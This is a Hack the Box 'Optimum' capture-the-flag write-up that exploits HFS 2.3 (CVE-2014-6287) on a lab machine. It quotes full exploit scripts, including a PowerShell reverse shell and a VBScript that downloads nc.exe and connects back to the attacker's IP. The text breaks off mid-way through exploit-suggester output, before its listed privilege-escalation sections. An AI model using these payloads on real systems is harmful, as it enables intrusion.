---
layout: post
layout: default
title: "Optimum"
description: "My writeup for the HacktheBox Optimum Machine. An easy machine that involved exploiting HFS and MS16-030."
category_string: "Hack the Box (HTB)"
custom_css: ['blogs']
---

# Hack the Box - Optimum

# Contents
- [Optimum Overview](#optimum-overview)
  - [Ratings](#ratings)
  - [Tags](#tags)
- [Enumeration](#enumeration)
  - [nmap](#nmap)
    - [All ports scan](#all-ports-scan)
    - [OS Enum](#os-enum)
  - [Gobuster](#gobuster)
- [Website](#website)
  - [Trying HFS Exploits](#trying-hfs-exploits)
- [Shell as kostas](#shell-as-kostas)
  - [Searching for an Exploit](#searching-for-an-exploit)
  - [Trying MS16-032](#trying-ms16-032)
    - [Attempting File Transfer](#attempting-file-transfer)
    - [Trying the Exploit](#trying-the-exploit)
  - [Getting a Better Shell](#getting-a-better-shell)
  - [Final Exploit](#final-exploit)
- [Key Lessons](#key-lessons)

# Optimum Overview

This is the seventh box in my OSCP prep series.

**Box Details**

|IP|Operating System|User-Rated Difficulty|Date Started|Date User Completed|Date System Completed|
|---|---|---|---|---|
|10.10.10.8|Windows|3.4|2021-06-13|2021-06-13|

---

This box was a little more involved than some previous Windows boxes, and required a bit of playing around with exploits till I found a working one. Still, it was pretty simple. It just involved finding a code execution vulnerability in the HFS server that was running on the box. This got us a shell as the `kostas` user. From here we could exploit ms16-032 to get a shell as `SYSTEM`.

## Ratings

I rated the user stage a 2 for difficulty. It took me about 40 minutes, and most of that was finding the correct exploit out of a large number of potential ones. I rated the final part the same difficulty - finding the correct exploit was fairly simple, but my main issue was getting it onto the box and finding the syntax to execute it. This took me a couple of hours, which is slow going - but I'm getting faster.

Matrix Rating:

![](/assets/images/blogs/Pasted image 20210613134842.png)

## Tags

#oscp-prep #no-metasploit #windows #web #hfs #kernel-exploit

# Enumeration

## nmap

I started with an `nmap` scan. I may run autorecon if I run out of ideas, but I'm liking it less and less every time I do it and feel I learn more from manual enum.

Initial nmap:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ nmap -sC -sV -v -oA nmap/optimum 10.10.10.8
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 11:07 BST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:07
Completed NSE at 11:07, 0.00s elapsed
Initiating NSE at 11:07
Completed NSE at 11:07, 0.00s elapsed
Initiating NSE at 11:07
Completed NSE at 11:07, 0.00s elapsed
Initiating Ping Scan at 11:07
Scanning 10.10.10.8 [2 ports]
Completed Ping Scan at 11:07, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:07
Completed Parallel DNS resolution of 1 host. at 11:07, 0.00s elapsed
Initiating Connect Scan at 11:07
Scanning 10.10.10.8 [1000 ports]
Discovered open port 80/tcp on 10.10.10.8
Completed Connect Scan at 11:07, 12.75s elapsed (1000 total ports)
Initiating Service scan at 11:07
Scanning 1 service on 10.10.10.8
Completed Service scan at 11:07, 6.12s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.8.
Initiating NSE at 11:07
Completed NSE at 11:07, 1.24s elapsed
Initiating NSE at 11:07
Completed NSE at 11:07, 0.23s elapsed
Initiating NSE at 11:07
Completed NSE at 11:07, 0.00s elapsed
Nmap scan report for 10.10.10.8
Host is up (0.062s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 11:07
Completed NSE at 11:07, 0.00s elapsed
Initiating NSE at 11:07
Completed NSE at 11:07, 0.00s elapsed
Initiating NSE at 11:07
Completed NSE at 11:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.41 seconds
```

Key findings:
- HTTP server on port 80, running HTTPFileServer 2.3
- Windows Box, not sure about version

That's really it.

### All ports scan

I also ran a quick all ports scan.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ nmap -p- -v -oA nmap/optimum-allports 10.10.10.8
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 11:09 BST
Initiating Ping Scan at 11:09
Scanning 10.10.10.8 [2 ports]
Completed Ping Scan at 11:09, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:09
Completed Parallel DNS resolution of 1 host. at 11:09, 0.01s elapsed
Initiating Connect Scan at 11:09
Scanning 10.10.10.8 [65535 ports]
Discovered open port 80/tcp on 10.10.10.8
Connect Scan Timing: About 17.47% done; ETC: 11:12 (0:02:26 remaining)
Connect Scan Timing: About 33.62% done; ETC: 11:12 (0:02:00 remaining)
Connect Scan Timing: About 53.43% done; ETC: 11:12 (0:01:19 remaining)
Connect Scan Timing: About 68.50% done; ETC: 11:12 (0:00:56 remaining)
Connect Scan Timing: About 82.35% done; ETC: 11:12 (0:00:32 remaining)
Completed Connect Scan at 11:12, 181.08s elapsed (65535 total ports)
Nmap scan report for 10.10.10.8
Host is up (0.036s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 181.49 seconds
```

This found no new ports.

### OS Enum

I tried enumerating the Operating System further with the `-O` flag.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ sudo nmap -O -oA nmap/os 10.10.10.8
[sudo] password for mac: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 11:32 BST
Nmap scan report for 10.10.10.8
Host is up (0.022s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds
```

The most likely system was Windows Server 2012.

## Gobuster

I ran a quick scan against the root of the website:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ gobuster dir -u http://10.10.10.8 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.8
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/13 11:10:50 Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 301) [Size: 44] [--> /]
Progress: 8158 / 43004 (18.97%)                      [ERROR] 2021/06/13 11:12:34 [!] Get "http://10.10.10.8/checkoutpayment": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
                                                      
===============================================================
2021/06/13 11:19:58 Finished
===============================================================
```

It didn't find anything new.

# Website

The website is an old looking file server:

![](/assets/images/blogs/Pasted image 20210613111026.png)

I ran a [gobuster scan](#gobuster) in the background while I poked around.

## Trying HFS Exploits

I tried a few different exploits here. As always I'll include the failed attempts so you can see the debugging process, but you can [skip to the right one](#working-hfs-exploit).

My first thought was to try and see if I could upload a file or exploit a CVE, so I ran `searchsploit`. It had one result:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ searchsploit httpfileserver
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                            | windows/webapps/49125.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

The exploit is really short:

{% raw %}
```python
# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 28-11-2020
# Remote: Yes
# Exploit Author: Óscar Andreu
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287

#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
	http = urllib3.PoolManager()	
	url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
	print(url)
	response = http.request('GET', url)
	
except Exception as ex:
	print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
	print(ex)
```
{% endraw %}

Running it ouputs a URL. It seems to be a null-byte vulnerability in the search field

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ searchsploit -m windows/webapps/49125.py
Copied to: /home/mac/Documents/HTB/optimum/49125.py
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ mv 49125.py HttpFileServerRCE.py
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ python3 HttpFileServerRCE.py 10.10.10.8 80 whoami
http://10.10.10.8:80/?search=%00{.+exec|whoami.}
```

Visiting the URL doesn't output the result anywhere:
![](/assets/images/blogs/Pasted image 20210613111557.png)

We might have to jump straight to a powershell reverse shell. If we knew the directory of the webserver we could do a staged payload (it might be `c:\inetpub\wwwroot` but we can't know for sure, and it doesn't seem to be IIS)

I tried this to try and get a shell:

`10.10.10.8/?search=%00{.+exec|powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.211',413);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()".}`

But no result. I checked if I could connect out to my box, but this also didn't work:

`10.10.10.8/?search=%00{.+exec|ping -n 1 10.10.16.211.}`

An alternate searchsploit term yielded more reuslts:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ searchsploit hfs
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service                                                                                                      | osx/dos/29454.txt
Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)                                                                                                                | osx/dos/12375.c
Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure                                                                                                            | osx/local/35488.c
Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation                                                                                                     | osx/local/8266.txt
FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution                                                                                                             | windows/remote/37985.py
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                                                            | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                                                            | multiple/remote/48569.py
Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service                                                                                                            | linux/dos/28895.txt
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                                 | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                                                                      | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                                         | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                                    | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                                    | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                               | windows/webapps/34852.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

I found this article useful for discerning which of these might be along the right path: [https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1190-exploit-public-facing-applications/rejetto-http-file-server-hfs-2.3](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1190-exploit-public-facing-applications/rejetto-http-file-server-hfs-2.3)

I tried one of the alternative exploits:

![](/assets/images/blogs/Pasted image 20210613113210.png)

But I wasn't getting anything on any of my listeners:

![](/assets/images/blogs/Pasted image 20210613112857.png)

![](/assets/images/blogs/Pasted image 20210613112915.png)

![](/assets/images/blogs/Pasted image 20210613113227.png)

Then I tried exploit number three: [https://www.exploit-db.com/exploits/39161](https://www.exploit-db.com/exploits/39161)

```python
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!


import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
```

This looked more promising as it had an actual payload. I changed the IP and port, and ran it.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ python2 39161.py 10.10.10.8 80
```

I didn't immediately get a hit.

Looking at my other listener, it now had some ICMP requests in it:

![](/assets/images/blogs/Pasted image 20210613113907.png)

This is strange - I guess they took a while to come through. But it means we did have code execution when we tried earlier - just no shell.

After a wait, the `39161.py` exploit also eventually executed, requesting the `nc.exe` file:

![](/assets/images/blogs/Pasted image 20210613115437.png)

I'd already moved onto the next exploit when I noticed this, but I would eventually [fix it](#getting-a-better-shell) in the final stage of priv esc.

I should have been a little more patient and then I may have been able to debug that I needed to host `nc.exe`, but the next exploit I tried was much easier to read and understand anyway.

### Working HFS Exploit

I tried another: [https://www.exploit-db.com/exploits/49584](https://www.exploit-db.com/exploits/49584)

{% raw %}
```python
# Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 20/02/2021
# Exploit Author: Pergyz
# Vendor Homepage: http://www.rejetto.com/hfs/
# Software Link: https://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Microsoft Windows Server 2012 R2 Standard
# CVE : CVE-2014-6287
# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands

#!/usr/bin/python3

import base64
import os
import urllib.request
import urllib.parse

lhost = "10.10.16.211"
lport = 413
rhost = "10.10.10.8"
rport = 80

# Define the command to be written to a file
command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'

# Encode the command in base64 format
encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
print("\nEncoded the command in base64 format...")

# Define the payload to be included in the URL
payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'

# Encode the payload and send a HTTP GET request
encoded_payload = urllib.parse.quote_plus(payload)
url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}'
urllib.request.urlopen(url)
print("\nEncoded the payload and sent a HTTP GET request to the target...")

# Print some information
print("\nPrinting some information for debugging...")
print("lhost: ", lhost)
print("lport: ", lport)
print("rhost: ", rhost)
print("rport: ", rport)
print("payload: ", payload)

# Listen for connections
print("\nListening for connection...")
os.system(f'nc -nlvp {lport}')
```
{% endraw %}

It seems this one starts a listener for us. I had to run it with root permissions to get it to bind to port 413 - but then I got a shell!

![](/assets/images/blogs/Pasted image 20210613114847.png)

And grabbed `user.txt.txt`:

![](/assets/images/blogs/Pasted image 20210613115128.png)

# Shell as kostas

Firstly I thought it was worth quickly checking for the Administrator flag and for other users on the box:

```cmd
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
d----         18/3/2017   1:52 ??            Administrator                                                             
d----         18/3/2017   1:57 ??            kostas                                                                    
d-r--         19/6/2021  10:43 ??            Public                                                                    


PS C:\Users> cd Administrator
PS C:\Users\Administrator> dir
PS C:\Users\Administrator> type root.txt
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator> cd ../Public
PS C:\Users\Public> dir


    Directory: C:\Users\Public


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
d-r--         22/8/2013   6:39 ??            Documents                                                                 
d-r--         22/8/2013   6:39 ??            Downloads                                                                 
d-r--         22/8/2013   6:39 ??            Music                                                                     
d-r--         22/8/2013   6:39 ??            Pictures                                                                  
d-r--         22/8/2013   6:39 ??            Videos                                                                    
-a---         19/6/2021  10:43 ??        469 nc.exe                                                                    
-a---         19/6/2021  10:43 ??        325 script.vbs                                                                


PS C:\Users\Public> cd ../Administrator
PS C:\Users\Administrator> dir /a:d
PS C:\Users\Administrator> dir /a:h

```

I could see the `Administrator` directory, but not read it. That's fine, but worth checking.

I did some basic enum:

```cmd
PS C:\Users\kostas\Desktop> whoami /all

USER INFORMATION
----------------

User Name      SID                                        
============== ===========================================
optimum\kostas S-1-5-21-605891470-2991919448-81205106-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

But I didn't find anything that useful in the privileges. Next I looked at `systeminfo`:

```cmd
PS C:\Users\kostas\Desktop> systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          19/6/2021, 10:09:40 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.464 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.919 MB
Virtual Memory: In Use:    584 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

## Searching for an Exploit

I ran Windows exploit suggester using this info:

```bash
┌──(mac㉿kali)-[~/Documents/enum/Windows-Exploit-Suggester]
└─$ python2 windows-exploit-suggester.py --database 2021-05-07-mssb.xls --systeminfo ~/Documents/HTB/optimum/systeminfo 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*] 
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*] 
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*] 
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*] 
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*] 
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*] 
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*] 
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
